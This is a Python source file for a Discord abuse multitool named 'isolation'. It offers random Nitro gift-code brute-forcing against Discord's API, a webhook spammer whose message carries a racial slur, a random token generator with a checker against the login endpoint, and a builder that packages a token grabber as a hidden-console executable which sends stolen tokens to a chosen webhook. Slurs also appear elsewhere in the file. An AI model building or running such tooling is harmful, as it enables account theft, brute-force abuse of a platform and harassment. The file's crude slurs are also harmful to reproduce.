try:
  from concurrent.futures import process
  import os
  from termcolor import colored
  from pystyle import Write
  import random
  import time
  import colorama
  from os import system, name
  from time import sleep
  from pystyle import Write, Colors, Colorate, Box
  from colorama import Fore, Back, Style
  import socket
  hostname=socket.gethostname()
  colorama.init()
  import time
  import random
  import sys
  import platform
  import shutil
  import json
  def clear_console():
      if os.name == 'nt':  
          os.system('cls')
      else:
          os.system("clear")

  clear_console()

  def loading_screen():
      loading_message = "Loading... "
      animation_chars = ["|", "/", "-", "\\"]
      duration = 3
      start_time = time.time()
      
      while time.time() - start_time < duration:
          for char in animation_chars:
              print(f"\r{loading_message} {char}", end="")
              time.sleep(0.1)

      print("\r" + " " * len(loading_message), end="")

  if __name__ == "__main__":
      loading_screen()
      print("\nLoading completed! ")
  while True:
    clear_console()

    Write.Print(f'''
      ██╗███████╗ ██████╗ ██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
      ██║██╔════╝██╔═══██╗██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
      ██║███████╗██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║
      ██║╚════██║██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
      ██║███████║╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
      ╚═╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
            
        ╔══════════════════════════════════════════════════════════════╗
        ║ [1] Nitro Gen + Checker              [10]                    ║  
        ║ [2] Webhook Spammer                  [11]                    ║
        ║ [3] Token Gen + Checker              [12]                    ║
        ║ [4] Netflix Generator                [13]                    ║
        ║ [5] Xbox GT Generator                [14]                    ║
        ║ [6] Hacking                                                  ║
        ║ [7] Doxxing                                                  ║
        ║ [8] Discord Selfbot                          [00] CREDITS    ║
        ║ [9] Token Grabber                            [99] EXIT       ║
        ╚══════════════════════════════════════════════════════════════╝
    ''', Colors.blue_to_cyan, interval=0.005)

    print(Fore.LIGHTBLUE_EX)
    choice = int(input("Choice:  "))

    if choice == 1:
      import os
      import ctypes
      import requests
      import random
      import string
      import time
      print("")
      
      clear_console()

      num = int(input('How much codes to generate and check?: '))

      with open("Nitro Codes.txt", "w", encoding='utf-8') as file:
        print("Your nitro codes are being generated!")

        start = time.time()

        for i in range(num):
          code = "".join(
            random.choices(string.ascii_uppercase + string.digits +
                          string.ascii_lowercase,
                          k=19))

          file.write(f"https://discord.gift/{code}\n")

      with open("Nitro Codes.txt") as file:
        for line in file.readlines():
          nitro = line.strip("\n")

          url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

          r = requests.get(url)

          if r.status_code == 200:
            print( f" Valid | {nitro} ")
            break
          else:
            print( f" Invalid | {nitro} ")

      time.sleep(0.2)

      print(
        "Valid codes will be in Valid Codes.txt - if there none then keep generating :)"
      )
      time.sleep(3)
    elif choice == 2:
      import requests
      from discord_webhooks import DiscordWebhooks
      
      clear_console()

      webhook_url = input('Webhook URL: ')

      message = input('Enter Message: ')
      ilosc = int(input('Enter Amount of Messages: '))


      webhook = DiscordWebhooks(webhook_url)

      webhook.set_content(title='get spammed nigga ass cock',
                        description=message,
                        color=0xF58CBA)

      webhook.set_footer(text='made w/ isolation')



      for i in range(ilosc):
          webhook.send()
    elif choice == 3:
      import random
      import string
      import pathlib
      import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib,       datetime, os.path
      import colorama
      from colorama import Fore, init, Back, Style
      from datetime import date
      if platform.system == "Windows":
        os.system("title [et-exploits token gen] Made by etxnight#1010")

      def Spinner():
        l = ['|', '/', '-', '\\']
        for i in l+l+l:
            sys.stdout.write('\r' + Fore.YELLOW +'Starting GEN...'+i)
            sys.stdout.flush()
            time.sleep(0.2)

      Spinner()

      banner = (Fore.LIGHTBLUE_EX+'''
      ██╗███████╗ ██████╗  ██████╗ ███████╗███╗   ██╗
      ██║██╔════╝██╔═══██╗██╔════╝ ██╔════╝████╗  ██║
      ██║███████╗██║   ██║██║  ███╗█████╗  ██╔██╗ ██║
      ██║╚════██║██║   ██║██║   ██║██╔══╝  ██║╚██╗██║
      ██║███████║╚██████╔╝╚██████╔╝███████╗██║ ╚████║
      ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝''')
      if platform.system() == "Windows":
        os.system("cls")
      else:
        os.system("clear")
      count = 0
      current_path = os.path.dirname(os.path.realpath(__file__))
      
      print(Fore.BLUE)
      print(Fore.LIGHTBLUE_EX+"[1] "+Fore.BLUE+"Token Generator(super fast!)")
      print(Fore.LIGHTBLUE_EX+"[2] "+Fore.BLUE+"Token Checker(Checks all tokens you generated)")
      print(Fore.LIGHTBLUE_EX+"[3] "+Fore.BLUE+"Exit")
      print(Fore.LIGHTBLUE_EX)
      opcion = input("\nChoice: ")
      if opcion=='1':
        os.system("cls")
        print(banner)
        cantidad = input("\nAmount to generate: ")
        while int(count)<int(cantidad):
            Generated = "NT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
            f= open(current_path +"/"+str("Generated")+str("")+".txt","a")
            f.write(Generated+"\n")
            print(Fore.CYAN +"Token: "+ Fore.RESET + Generated)
            count+=1
            if int(count)==int(cantidad):
              print("\n" + Fore.CYAN +Fore.RED +"Tokens generated successfully!")
              print(Fore.WHITE +Fore.BLUE +"Tokens saved in Generated.txt")
              input(Fore.BLUE +Fore.BLUE +"\nPress enter to exit")
              os.system("cls")

              print(Fore.LIGHTBLUE_EX+"Closing!")
              print(Fore.LIGHTBLUE_EX+"Have a good day :D")

              time.sleep(2)
              sys.exit()
              pass
        pass
      if opcion=='2':
        os.system("cls")
        print("\n" + banner + "\n")
        with open('Generated.txt', 'r') as f:
          for line in f:
              time.sleep(0)
              token = line.rstrip("\n")
              headers = {
                  'Authorization': f'{token}'  
              }
              src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)

              try:
                  if src.status_code == 200:
                      print(f'{Fore.LIGHTGREEN_EX}Valid token! >{Fore.RESET} ' + token)
                  else:
                      print(f'{Fore.RED}InValid token >{Fore.RESET} ' + token)
              except Exception:
                  print(f"{Fore.RED}Error{Fore.RESET}")
      pass
      if opcion=='3':
        if platform.system()== "Windows":
          os.system("cls")
        else:
          os.system("clear")
        print(Fore.LIGHTBLUE_EX+"Closing!")
        print(Fore.BLUE+"Have a good day :D")
        time.sleep(2)
        sys.exit()
        pass
    elif choice == 9:
      try:
        shutil.rmtree("./build/")
        shutil.rmtree("./dist/")
        for filename in os.listdir("./"):
          if filename.endswith('.spec'):
              file_path = os.path.join("./", filename)
              os.remove(file_path)
      except:
        print("First build detected hehe")
      os.mkdir("./build/")
      shutil.copy("./grabber_utils/CODE.py", "./build/")
      filename= input("Name of the file: ")
      os.rename("./build/CODE.py", f"./build/{filename}.py")
      webhook_to_cfg = input("webhook: ")
      webhook_cfg = {
        "WEBHOOK":webhook_to_cfg
      }
      webhook_ready = json.dumps(webhook_cfg)
      with open("./build/CONFIG.json","w") as f:
        f.write(webhook_ready)
        f.close()
      if platform.system() == "Windows":
        import PyInstaller.__main__
        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json;.","--clean","--workpath=./build/","--noconsole"])
      else:
        import PyInstaller.__main__
        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.","--clean","--workpath=./build/"])
    elif choice == 99:
        Write.Print(f'''
      ██╗███████╗ ██████╗ ██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
      ██║██╔════╝██╔═══██╗██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
      ██║███████╗██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║
      ██║╚════██║██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
      ██║███████║╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
      ╚═╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
            
        ╔══════════════╗
        ║ Bye {hostname}
        ╚══════════════╝
    ''', Colors.blue_to_cyan, interval=0.0005)
    sys.exit()
except KeyboardInterrupt:
  print("")
  print("bhai negr >:3")